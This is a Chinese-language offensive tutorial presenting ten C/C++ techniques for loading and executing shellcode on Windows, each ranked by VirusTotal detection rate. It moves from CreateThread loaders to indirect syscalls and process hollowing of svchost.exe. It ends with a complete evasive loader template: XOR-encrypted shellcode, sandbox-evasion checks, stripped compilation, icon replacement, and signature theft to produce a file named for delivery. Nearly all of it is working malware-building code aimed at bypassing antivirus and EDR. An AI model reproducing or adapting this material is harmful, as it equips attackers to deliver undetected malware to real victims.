# 03 - C/C++ Shellcode加载（10种方法）

## 方法1：经典 CreateThread（最高检测率）
```c
#include <windows.h>
int main() {
    unsigned char shellcode[] = "\xfc\x48\x83...";
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
    Sleep(INFINITE);
    return 0;
}
```
VT: ~45/70 | 检测：PAGE_EXECUTE_READWRITE + CreateThread

## 方法2：分阶段内存分配（RW → RX）
```c
void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_READWRITE);
memcpy(exec, shellcode, sizeof(shellcode));
DWORD old;
VirtualProtect(exec, sizeof(shellcode), PAGE_EXECUTE_READ, &old);
((void(*)())exec)();
```
VT: ~35/70 | 更好，避免RWX

## 方法3：HeapCreate + HeapAlloc（HEAP_CREATE_ENABLE_EXECUTE）
```c
HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
void *exec = HeapAlloc(hHeap, 0, sizeof(shellcode));
memcpy(exec, shellcode, sizeof(shellcode));
((void(*)())exec)();
```
VT: ~38/70

## 方法4：fiber（纤程执行，隐蔽性高）
```c
void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(exec, shellcode, sizeof(shellcode));
LPVOID fiber = ConvertThreadToFiber(NULL);
LPVOID shell_fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)exec, NULL);
SwitchToFiber(shell_fiber);
```
VT: ~30/70 | 不直接调用CreateThread

## 方法5：CallWindowProcA（回调函数执行）
```c
void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(exec, shellcode, sizeof(shellcode));
CallWindowProcA((WNDPROC)exec, 0, 0, 0, 0);
```
VT: ~28/70 | 无新线程创建

## 方法6：EnumFonts / EnumDisplayMonitors（回调链）
```c
void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(exec, shellcode, sizeof(shellcode));
HDC hdc = GetDC(NULL);
EnumFontsW(hdc, NULL, (FONTENUMPROCW)exec, 0);
```
VT: ~25/70 | 利用系统回调

## 方法7：CerprocessPolicy（CTF回调）
```c
void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(exec, shellcode, sizeof(shellcode));
// 构造CTF相关参数触发回调
```
VT: ~22/70

## 方法8：直接系统调用（绕过用户态Hook）
```c
// 从ntdll.dll动态提取SSN
UINT_PTR pNtAllocateVirtualMemory;
GetSyscallAddr("NtAllocateVirtualMemory", &pNtAllocateVirtualMemory);
// syscall stub
__asm {
    mov r10, rcx
    mov eax, ssn    ; 系统服务号
    syscall
    ret
}
```
VT: ~10/70 | 需要处理版本兼容

## 方法9：间接系统调用（Halo's Gate / Hell's Gate）
```c
// 解析ntdll.dll导出表获取syscall gadget
// SSN = syscall_entry_addr + 4 (读取mov eax, imm32)
DWORD ssn = *(DWORD*)(func_addr + 4);
// 从ntdll.dll中找未hook的syscall;ret gadget
PVOID gadget = FindSyscallGadget(ntdll_base);
// 使用gadget执行syscall，调用栈在ntdll范围内
```
VT: ~3-8/70 | 推荐⭐⭐⭐

## 方法10：Process Hollowing + 间接Syscall
```c
// 1. CreateProcess(svchost.exe, CREATE_SUSPENDED, ...)
// 2. NtUnmapViewOfSection(hProcess, pImageBase)
// 3. NtAllocateVirtualMemory(hProcess, &remoteBase, ...) via indirect syscall
// 4. Write shellcode via NtWriteVirtualMemory (indirect syscall)
// 5. Update PEB ImageBase via NtWriteVirtualMemory
// 6. SetThreadContext → update RCX (entry point)
// 7. NtResumeThread
```
VT: ~2-5/70 | 最推荐 ⭐⭐⭐⭐⭐

---

## 通用模板：C间接Syscall Loader（完整代码框架）
```c
#include <windows.h>
#include <winternl.h>

// Syscall stub — 从ntdll.dll找gadget
EXTERN_C NTSTATUS SysNtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

// XOR解密shellcode（编译前用脚本加密）
void XORDecrypt(unsigned char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) data[i] ^= key;
}

// 延迟执行绕过沙箱
void SandboxEvade() {
    Sleep(30000);  // 30秒延时
    // 或者：检测CPU核心数、内存大小、磁盘大小
    SYSTEM_INFO si; GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) ExitProcess(0);
}

int main() {
    SandboxEvade();
    
    unsigned char enc_shellcode[] = { /* XOR加密的shellcode */ };
    SIZE_T sc_len = sizeof(enc_shellcode);
    
    // 解密
    XORDecrypt(enc_shellcode, sc_len, 0x5A);
    
    // 间接syscall分配RW
    PVOID base = NULL;
    SIZE_T region = sc_len;
    SysNtAllocateVirtualMemory(GetCurrentProcess(), &base, 0, &region, MEM_COMMIT, PAGE_READWRITE);
    
    // 写入shellcode
    memcpy(base, enc_shellcode, sc_len);
    
    // 改内存保护为RX
    DWORD old;
    VirtualProtect(base, sc_len, PAGE_EXECUTE_READ, &old);
    
    // 通过纤程或回调执行
    LPVOID fiber = ConvertThreadToFiber(NULL);
    LPVOID shell_fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)base, NULL);
    SwitchToFiber(shell_fiber);
    
    return 0;
}
```

### 编译命令
```bash
# MSVC
cl.exe /MT /O2 /GS- /GL /Gy /Tc loader.c /Fe:loader.exe

# MinGW
x86_64-w64-mingw32-gcc -O2 -s -fno-ident -fno-stack-protector \
  -Wl,--gc-sections,--strip-all -o loader.exe loader.c -lntdll
```

### 编译后处理
```bash
# 资源修改
ResourceHacker.exe -open loader.exe -save final.exe -action addoverwrite -res icon.ico -mask ICONGROUP,MAINICON,
# 签名窃取
python sigthief.py -i signed_legit.exe -t final.exe -o deliver.exe
```
